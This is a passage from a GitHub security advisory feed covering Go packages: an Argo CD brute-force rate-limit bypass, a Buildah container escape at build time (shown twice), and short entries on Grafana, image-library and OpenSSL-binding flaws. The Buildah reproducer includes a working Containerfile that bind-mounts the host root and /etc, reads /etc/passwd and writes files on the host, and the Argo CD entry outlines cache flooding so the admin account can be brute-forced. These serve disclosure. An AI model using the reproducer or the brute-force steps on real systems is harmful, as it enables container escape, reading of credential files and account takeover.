<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>
<p>The brute force protection mechanism's code:</p>
<pre><code class="language-go">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {
       log.Warnf("Session cache size exceeds %d entries, removing random entry",

getMaximumCacheSize())
       idx := rand.Intn(len(failures) - 1)
       var rmUser string
       i := 0
       for key := range failures {

           if i == idx {
               rmUser = key

               delete(failures, key)

break

}

i++ }

       log.Infof("Deleted entry for user %s from cache", rmUser)
   }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Set up the application environment and identify the login page.</li>
<li>Execute 4 failed login attempts for the admin account.</li>
<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>
<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>
<li>At this point, brute-force the admin account.</li>
</ol>
<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">older CVE</a> rate limit patches useless.</p>
<h3 id="impact">Impact</h3>
<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21662">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>
<li><a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgg-9h6w-m454">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgg-9h6w-m454</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-03-27T17:28:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-03-27T17:28:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana/pkg/tsdb/mysql] Grafana Arbitrary File Read]]></title>
        <id>https://github.com/advisories/GHSA-4pwp-cx67-5cpx</id>
        <link href="https://github.com/advisories/GHSA-4pwp-cx67-5cpx"/>
        <updated>2024-03-22T18:29:33.000Z</updated>
        <content type="html"><![CDATA[<p>Grafana &lt;= 6.4.3 has an Arbitrary File Read vulnerability, which could be exploited by an authenticated attacker that has privileges to modify the data source configurations.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-19499">https://nvd.nist.gov/vuln/detail/CVE-2019-19499</a></li>
<li><a href="https://github.com/grafana/grafana/pull/20192">https://github.com/grafana/grafana/pull/20192</a></li>
<li><a href="https://github.com/grafana/grafana/blob/master/CHANGELOG.md#644-2019-11-06">https://github.com/grafana/grafana/blob/master/CHANGELOG.md#644-2019-11-06</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200918-0003/">https://security.netapp.com/advisory/ntap-20200918-0003/</a></li>
<li><a href="https://swarm.ptsecurity.com/grafana-6-4-3-arbitrary-file-read/">https://swarm.ptsecurity.com/grafana-6-4-3-arbitrary-file-read/</a></li>
<li><a href="https://github.com/advisories/GHSA-4pwp-cx67-5cpx">https://github.com/advisories/GHSA-4pwp-cx67-5cpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4pwp-cx67-5cpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-31T23:11:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[simonwaldherr.de/go/zplgfa] Index out of bounds leading to crash]]></title>
        <id>https://github.com/advisories/GHSA-xgmm-3vvr-6c8j</id>
        <link href="https://github.com/advisories/GHSA-xgmm-3vvr-6c8j"/>
        <updated>2024-03-21T18:58:12.000Z</updated>
        <content type="html"><![CDATA[<p>ZPLGFA 1.1.1 allows attackers to cause a panic (because of an integer index out of range during a ConvertToGraphicField call) via an image of zero width. NOTE: it is unclear whether there are common use cases in which this panic could have any security consequence</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36307">https://nvd.nist.gov/vuln/detail/CVE-2023-36307</a></li>
<li><a href="https://github.com/SimonWaldherr/zplgfa/pull/6">https://github.com/SimonWaldherr/zplgfa/pull/6</a></li>
<li><a href="https://github.com/SimonWaldherr/zplgfa/commit/c0d018ffa921cd2460b80f766b7969fbe63678fc">https://github.com/SimonWaldherr/zplgfa/commit/c0d018ffa921cd2460b80f766b7969fbe63678fc</a></li>
<li><a href="https://github.com/advisories/GHSA-xgmm-3vvr-6c8j">https://github.com/advisories/GHSA-xgmm-3vvr-6c8j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xgmm-3vvr-6c8j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-09-05T06:30:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/disintegration/imaging] Crash when processing crafted TIFF files]]></title>
        <id>https://github.com/advisories/GHSA-q7pp-wcgr-pffx</id>
        <link href="https://github.com/advisories/GHSA-q7pp-wcgr-pffx"/>
        <updated>2024-03-21T18:57:47.000Z</updated>
        <content type="html"><![CDATA[<p>Disintegration Imaging 1.6.2 allows attackers to cause a panic (because of an integer index out of range during a Grayscale call) via a crafted TIFF file to the scan function of scanner.go. NOTE: it is unclear whether there are common use cases in which this panic could have any security consequence</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36308">https://nvd.nist.gov/vuln/detail/CVE-2023-36308</a></li>
<li><a href="https://github.com/disintegration/imaging/issues/165">https://github.com/disintegration/imaging/issues/165</a></li>
<li><a href="https://github.com/disintegration/imaging/releases/tag/v1.6.2">https://github.com/disintegration/imaging/releases/tag/v1.6.2</a></li>
<li><a href="https://github.com/advisories/GHSA-q7pp-wcgr-pffx">https://github.com/advisories/GHSA-q7pp-wcgr-pffx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q7pp-wcgr-pffx</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-09-05T06:30:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/microsoft/go-crypto-openssl/openssl] Memory leaks in code encrypting and verifying RSA payloads]]></title>
        <id>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</id>
        <link href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6"/>
        <updated>2024-03-21T14:05:20.000Z</updated>
        <content type="html"><![CDATA[<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>
<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>
<li><a href="https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>
<li><a href="https://github.com/golang-fips/openssl/releases/tag/v2.0.1">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/golang-fips/openssl/v2] Memory leaks in code encrypting and verifying RSA payloads]]></title>
        <id>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</id>
        <link href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6"/>
        <updated>2024-03-21T14:05:20.000Z</updated>
        <content type="html"><![CDATA[<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>
<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>
<li><a href="https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>
<li><a href="https://github.com/golang-fips/openssl/releases/tag/v2.0.1">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/microsoft/go-crypto-openssl] Memory leaks in code encrypting and verifying RSA payloads]]></title>
        <id>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</id>
        <link href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6"/>
        <updated>2024-03-21T14:05:20.000Z</updated>
        <content type="html"><![CDATA[<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>
<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>
<li><a href="https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>
<li><a href="https://github.com/golang-fips/openssl/releases/tag/v2.0.1">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/golang-fips/openssl/openssl] Memory leaks in code encrypting and verifying RSA payloads]]></title>
        <id>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</id>
        <link href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6"/>
        <updated>2024-03-21T14:05:20.000Z</updated>
        <content type="html"><![CDATA[<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>
<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>
<li><a href="https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>
<li><a href="https://github.com/golang-fips/openssl/releases/tag/v2.0.1">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:10:36.000Z</published>
    </entry>
</feed>